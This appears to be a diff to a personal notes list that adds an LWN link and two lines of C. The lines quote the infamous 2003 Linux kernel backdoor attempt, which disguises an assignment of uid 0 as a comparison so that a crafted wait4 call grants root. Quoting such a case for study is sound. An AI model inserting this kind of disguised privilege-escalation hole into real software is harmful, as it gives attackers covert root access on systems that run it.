@@ -177,3 +177,11 @@ lesser key of solomon
 stereo sound is dumb
 
 anonswiki
+
+
+https://lwn.net/Articles/57135/
++       if ((options == (__WCLONE|__WALL)) && (current->uid = 0))
++                       retval = -EINVAL;
+
+
+
